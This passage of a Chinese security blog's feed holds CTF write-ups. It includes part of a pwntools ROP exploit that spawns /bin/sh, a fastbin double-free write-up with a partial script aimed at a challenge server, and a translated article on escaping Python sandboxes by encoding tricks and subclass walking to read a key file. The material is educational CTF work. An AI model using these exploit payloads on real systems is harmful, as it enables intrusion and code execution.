class="comment"># rbx be 0x0</span></span><br><span class="line">        pl += p64(<span class="number">0x1</span>)     <span class="comment"># rbp be 0x1</span></span><br><span class="line">        pl += p64(jmp2)    <span class="comment"># r12 jump to</span></span><br><span class="line">        pl += p64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">        pl += p64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">        pl += p64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">        pl += p64(part2)   <span class="comment"># part2 entry will call [rbx + r12 + 0x8]</span></span><br><span class="line">        <span class="keyword">return</span> pl</span><br><span class="line">payload =  com_gadget(gadget_1,gadget_2,addr_got_read,arg1=<span class="number">0x0</span>,arg2=addr_got_alarm,arg3=<span class="number">1</span>)</span><br><span class="line">payload += com_gadget(gadget_1,gadget_2,addr_got_read,arg1=<span class="number">0x0</span>,arg2=addr_bss,arg3=<span class="number">0x3B</span>,Flag=<span class="literal">False</span>)</span><br><span class="line">payload += com_gadget(gadget_1,gadget_2,addr_bss+<span class="number">8</span>,arg1=addr_bss,arg2=<span class="number">0x0</span>,arg3=<span class="number">0x0</span>,Flag=<span class="literal">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">print</span> payload</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(payload), <span class="number">0</span>, <span class="number">-8</span>):</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">        write_stack(payload[i<span class="number">-8</span>:i])</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    raw_input(<span class="string">&#x27;0x00000000004006F5 &#x27;</span>)</span><br><span class="line">    p.sendline(str(token))</span><br><span class="line">    p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x18</span> + p64(<span class="number">0x00000000004006CB</span>))</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    off = <span class="number">5</span></span><br><span class="line">    p.send(str(off))  <span class="comment"># ovwer write one byte</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    payload2 = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">    payload2 += p64(<span class="number">0x0000000000400540</span>)</span><br><span class="line">    payload2 += (<span class="number">0x3B</span> - len(payload2) - <span class="number">1</span>) * <span class="string">&quot;A&quot;</span></span><br><span class="line">    p.sendline(payload2)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="fast-fast-fast"><a href="#fast-fast-fast" class="headerlink" title="fast fast fast"></a>fast fast fast</h2><p>一个多重释放的题目，我想这个题目，用来做demo，写个double free的分析。<br>fastbin的利用，目标就是控制fd指针，然后分配到自己想要的地址，正好全局指针都在.bss。<br>程序的漏洞是double free。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">delet</span><span class="params">(__int64 ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@1</span></span><br><span class="line">  <span class="built_in">free</span>(*(_QWORD *)(ptr + <span class="number">16</span>));</span><br><span class="line">  result = ptr;</span><br><span class="line">  *(_QWORD *)ptr = <span class="number">0L</span>L;                         <span class="comment">// set flag 0</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用过程：</p><pre><code>分配一个fastbin，然后释放掉分配一个smallbin，然后释放fastbin(其实这里释放的是smallbin)再次分配刚才释放掉的块(fastbin的菜单里)编辑释放块，这里要伪造chunk调用saysercrt()分配fastbin分配的想要的块(得到一个.bss上的指针)之后利用edit功能，可以完成任意地址读写</code></pre><p>不过要注意的是，因为程序是静态连接的，我们需要得到一个任意地址读，所以我们选择覆盖<br><code>.bss:00000000006C3750 __free_hook     dq ?                    ; DATA XREF: ptmalloc_lock_all+CDr</code><br>为<br><code>.text:00000000004082A0                 sub     rsp, 0D8h       ; Alternative name is &#39;_IO_printf&#39;</code><br>由于开了NX<br>我们需要，ROP起shell(syscall那种)，要么mprotect改写内存属性执行写进去的sc。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"><span class="meta">#edit by ysyy@NeSE</span></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">from time <span class="keyword">import</span> sleep</span><br><span class="line">from sys <span class="keyword">import</span> argv</span><br><span class="line">from autorop <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">#s = remote(&#x27;127.0.0.1&#x27;,4545)</span><br><span class="line">s = remote(&#x27;106.75.66.195&#x27;,11001)</span><br><span class="line"><span class="meta">#s = remote(lhost,lport,timeout=1.5)</span></span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function">def <span class="title">fastbin</span><span class="params">()</span>:</span></span><br><span class="line">    s.sendline(&#x27;1&#x27;)</span><br><span class="line">    s.recvuntil(&#x27;3 : delet\n&#x27;)</span><br><span class="line"> </span><br><span class="line"><span class="function">def <span class="title">normalchunk</span><span class="params">()</span>:</span></span><br><span class="line">    s.sendline(&#x27;2&#x27;)</span><br><span class="line">    s.recvuntil(&#x27;3 : del</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>wp <a href="http://bbs.ichunqiu.com/thread-18979-1-1.html">http://bbs.ichunqiu.com/thread-18979-1-1.html</a><br>muhe博客 <a href="http://o0xmuhe.me/2017/02/16/ichunqiu-CTF-2017-2/">http://o0xmuhe.me/2017/02/16/ichunqiu-CTF-2017-2/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ichunqiu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python沙箱逃逸</title>
      <link href="Python-sandbox-escape.html"/>
      <url>Python-sandbox-escape.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="python沙箱逃逸"><a href="#python沙箱逃逸" class="headerlink" title="python沙箱逃逸"></a>python沙箱逃逸</h1><p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<a href="http://bobao.360.cn/learning/detail/3542.html">http://bobao.360.cn/learning/detail/3542.html</a><br>原文链接：<a href="http://blog.isis.poly.edu/ctf/exploitation%20techniques/2012/10/26/escaping-python-sandboxes/">http://blog.isis.poly.edu/ctf/exploitation%20techniques/2012/10/26/escaping-python-sandboxes/</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作为一个CTF爱好者，又是一个Bin选手，在国外各种受虐的同时，总是能学到不少的东西。最近，和师傅们在做国外的CTF题，做到一种Pwn题目，是需要选手在Python的沙箱达到逃逸的目的，获取flag。在谷歌的过程中，找到了一篇不错的博文。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>注意：这是为Python 2.7.3编写的。这些细节可能在其他版本的Python - 特别是Python3 - 有所不同！</p><p>尝试逃离沙箱总是一个有趣的挑战。Python沙箱也不例外。在静态语言中，这通常通过分析代码来查看是否调用某些函数，或者用确认验证的代码包装危险函数来完成。然而，这在动态语言（如Python）中有点更具挑战性。</p><p>沙盒的一个简单方法是扫描脚本的内容，以查找危险的特定关键字或函数，例如eval，exec，execfile和import。这可以很容易地通过编码我们的脚本来侧面攻击。<a href="http://www.python.org/dev/peps/pep-0263/">PEP-0263</a>，这里有更加详细的介绍。<br>但只要你有<code># coding:&lt;encoding&gt;</code>脚本的前两行之一，Python解释器将解释这个编码的整个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: rot_13</span></span><br><span class="line"><span class="comment"># &quot;import evil_module&quot; encoded in ROT13</span></span><br><span class="line"><span class="string">&#x27;vzcbeg rivy_zbqhyr&#x27;</span></span><br></pre></td></tr></table></figure><p>显然，我们需要一种更好的思路来进行逃逸。但是这之前，我们需要了解一些背景知识。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>我们知道，<code>dir</code>可以作为我们检Python对象的第一个工具。引动docs:“Without arguments, return the list of names in the current local scope. With an argument, attempt to return a list of valid attributes for that object.”，就是说，“ 没有参数，返回当前本地作用域中的名称列表。使用参数，尝试返回该对象的有效属性的列表。“<br>它并不声称是完整的，一个类可以定义一个<code>__dir__</code>方法，但现在我们可以假设它是正确的。</p><p>我们经常使用的第二个功能是<code>type</code>，简单来说，使用单个参数，它会给你一个对象的类型 - 这可以有助于理解什么是一旦你知道它的存在。再次，引用文档：“ 返回对象的类型。返回值是一个类型对象。“。</p><p>所以现在让我们开始戳。</p><p>当执行开始时，以下对象在本地作用域中（yay dir()！）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir()</span><br><span class="line">[<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>]</span><br><span class="line">从这些，__builtins__是最有趣。</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(__builtins__)</span><br><span class="line">&lt;type <span class="string">&#x27;module&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>嗯，让我们看看Python语言参考： “一个模块对象有一个由字典对象实现的命名空间…属性引用被转换为这个字典中的查找，例如，m.x等同于m。dict [“x”]“`</p><p>现在，我们可以检查内置程序简单地通过运行dir(<strong>builtins</strong>) 该列表有点长。条目是所有内置类型和函数。</p><p>所以现在让我们重温前面的沙盒测试的字符串检查方法。也许你没有能力改变整个文件的编码。您仍然可以通过访问模块的底层dict，然后使用变量访问所需的函数来对单个函数调用的名称进行编码。所以让我们import os使用内置函数稍微狡猾的方式调用<strong>import__：首先获取base64版本的字符串”__import</strong>“和”os”：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br></pre></td></tr></table></figure><p>把它放在一起：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>嗯，所以使用文本过滤到沙盒代码很明显。</p><p>也许我们可以采取另一种方法在过滤，基于使用<strong>builtins</strong>.<strong>dict__。因为__builtins</strong>.__dict__是一个代表我们的环境可用的所有内置函数的字典，如果我们修改其中一个条目，我们可以改变环境的可用内容。</p><p>例如，abs函数返回数字的绝对值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>abs(<span class="number">-1</span>)</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p>##　尝试攻击<br>现在，让我们做更多的操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;abs&#x27;</span>] = <span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>abs(<span class="number">-1</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: <span class="string">&#x27;NoneType&#x27;</span> object <span class="keyword">is</span> <span class="keyword">not</span> callable</span><br></pre></td></tr></table></figure><p>该del语句删除一个对象的引用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;abs&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>abs(<span class="number">-1</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;abs&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure><p>我们刚刚删除了环境调用的能力abs！所以现在我们有另一种方法来处理Python沙盒 - 删除许多“危险”内置函数。</p><p>让我们做一个小的危险函数列表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>] <span class="comment"># __import__ is the function called by the import statement</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>] <span class="comment"># evaluating code could be dangerous</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;execfile&#x27;</span>] <span class="comment"># likewise for executing the contents of a file</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;input&#x27;</span>] <span class="comment"># Getting user input and evaluating it might be dangerous</span></span><br></pre></td></tr></table></figure><p>嗯，这看起来有点安全，对吧？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: __import__ <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure><p>等一下！<br>reload(module) 重新加载导入的模块，并执行代码 - 所以模块被导回到我们的命名空间。   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(os)</span><br></pre></td></tr></table></figure><p>我想我们必须将其添加到列表中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;reload&#x27;</span>] <span class="comment"># they might reload __builtins__ !</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>好。所以现在我们有一个安全的方法，对吧？我们阻止了沙箱中的任何人使用危险的内置命令，并且我们可以通过不允许他们对整个文件进行编码和扫描内容来阻止他们使用eval关键字。希望我们删除所有危险的内置…<br>让我们从<strong>2012.hack.lu</strong>在他们的题目中，你需要读取一个文件，’./key’的内容。</p><p>他们首先通过删除引用来销毁打开文件的内置函数。然后它们允许您执行用户输入。看看他们的代码稍微修改的版本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span>():</span></span><br><span class="line">    UNSAFE = [<span class="string">&#x27;open&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;file&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;execfile&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;compile&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;reload&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;__import__&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;eval&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;input&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"><span class="comment"># Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Go Ahead, Expoit me &gt;;D&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Read user input until the first whitespace character</span></span><br><span class="line">        inp = findall(<span class="string">&#x27;\S+&#x27;</span>, raw_input())[<span class="number">0</span>]</span><br><span class="line">        a = <span class="literal">None</span></span><br><span class="line">        <span class="comment"># Set a to the result from executing the user input</span></span><br><span class="line">        <span class="keyword">exec</span> <span class="string">&#x27;a=&#x27;</span> + inp</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Return Value:&#x27;</span>, a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;Exception:&#x27;</span>, e</span><br></pre></td></tr></table></figure><p>编码技巧不会工作 - 我们没有参考file或open在__builtins__。但是，也许我们可以参考挖出来file，或open从解释其他位置并使用它？<br>让我们深入一点<br>（对于这一部分，我需要对<a href="http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html">Ned Batchelder</a>参考学习，我一年的夏天正在阅读他的<a href="https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html">博客</a>，他有一个很好的eval写法，说明一个非常危险的语句，他在他的代码中通过这个方法）。<br>如前所述，type在对象上运行返回一个type object。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>type( [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] )</span><br><span class="line">&lt;type <span class="string">&#x27;list&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>现在，让我们开始检查一个元组的字段：<br>这些都是功能。但__class__有点有趣。它返回表示对象的类。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(().__class__)</span><br><span class="line">&lt;type <span class="string">&#x27;type&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>这进入元类和元类型详细信息。更多的内容都在，<a href="http://www.python.org/dev/peps/pep-0253/">PEP 0253</a>。让我们现在忽略，并深入一点。</p><p>根据文档，新式类有一些特殊的属性。具体来说，<strong>bases__它包含“基类，按它们在基类列表中出现的顺序” class.__subclasses</strong>()，并返回所有子类的列表。</p><p>让我们来看看我们的元组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__</span><br><span class="line">(&lt;type <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br></pre></td></tr></table></figure><p>它直接从对象继承。我不知道还有什么：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">[&lt;type <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;type <span class="string">&#x27;int&#x27;</span>&gt;, &lt;type <span class="string">&#x27;basestring&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;type <span class="string">&#x27;list&#x27;</span>&gt;, &lt;type <span class="string">&#x27;NoneType&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;type <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;type <span class="string">&#x27;super&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;xrange&#x27;</span>&gt;, &lt;type <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;type <span class="string">&#x27;set&#x27;</span>&gt;, &lt;type <span class="string">&#x27;slice&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;type <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;type <span class="string">&#x27;float&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;buffer&#x27;</span>&gt;, &lt;type <span class="string">&#x27;long&#x27;</span>&gt;, &lt;type <span class="string">&#x27;frozenset&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;property&#x27;</span>&gt;, &lt;type <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;type <span class="string">&#x27;tuple&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;type <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;type <span class="string">&#x27;code&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;type <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;type <span class="string">&#x27;function&#x27;</span>&gt;, &lt;type <span class="string">&#x27;classobj&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;dictproxy&#x27;</span>&gt;, &lt;type <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;type <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;type <span class="string">&#x27;instance&#x27;</span>&gt;, &lt;type <span class="string">&#x27;ellipsis&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;type <span class="string">&#x27;file&#x27;</span>&gt;, &lt;type <span class="string">&#x27;sys.long_info&#x27;</span>&gt;,</span><br><span class="line"><span class="meta">... </span><span class="keyword">and</span> more!</span><br></pre></td></tr></table></figure><p>我们在这里有我们需要的一切！</p><p>然后我可以file用一些简单的行在列表中找到索引：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>all_classes = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> entry <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line"><span class="meta">... </span>    all_classes.append(entry.__name__)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>all_classes.index(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="number">40</span></span><br></pre></td></tr></table></figure><p>我们不能在挑战中使用这个代码（甚至重写为列表解析），因为它包括空格。但是由于file在索引40，我们可以硬编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line">&lt;type <span class="string">&#x27;file&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>一旦我们引用了文件，我们所需要做的就是创建一个文件对象并读取它：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;./key&quot;</span>).read()</span><br><span class="line"><span class="string">&quot;This works&quot;</span></span><br></pre></td></tr></table></figure><p>所以解决题目我们需要，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">moshe@moshe-desktop:~$ netcat ctf.fluxfingers.net 2045</span><br><span class="line">Go Ahead, Expoit me &gt;;D</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](<span class="string">&quot;./key&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](<span class="string">&quot;./key&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">Return Value: FvibLF0eBkCBk</span><br></pre></td></tr></table></figure><p>在旁注中，我们不需要在单个语句中执行 - exec在当前上下文中运行代码，因此通过将每个命令的输出存储在变量（除了a）之外，我们可以轻松地保持命令之间的状态。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">moshe@moshe-desktop:~$ netcat ctf.fluxfingers.net 2045</span><br><span class="line">Go Ahead, Expoit me &gt;;D</span><br><span class="line">x=23</span><br><span class="line">x=23</span><br><span class="line">Return Value: 23</span><br><span class="line">45</span><br><span class="line">45</span><br><span class="line">Return Value: 45</span><br><span class="line">x</span><br><span class="line">x</span><br><span class="line">Return Value: 23</span><br></pre></td></tr></table></figure><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><ul><li>另一个魔法可能是有用的：http : //<a href="http://www.reddit.com/r/Python/comments/hftnp/ask">www.reddit.com/r/Python/comments/hftnp/ask</a> rpython恢复清除的全局/ c1v372r</li><li>Ned Batchelder的博文：http : 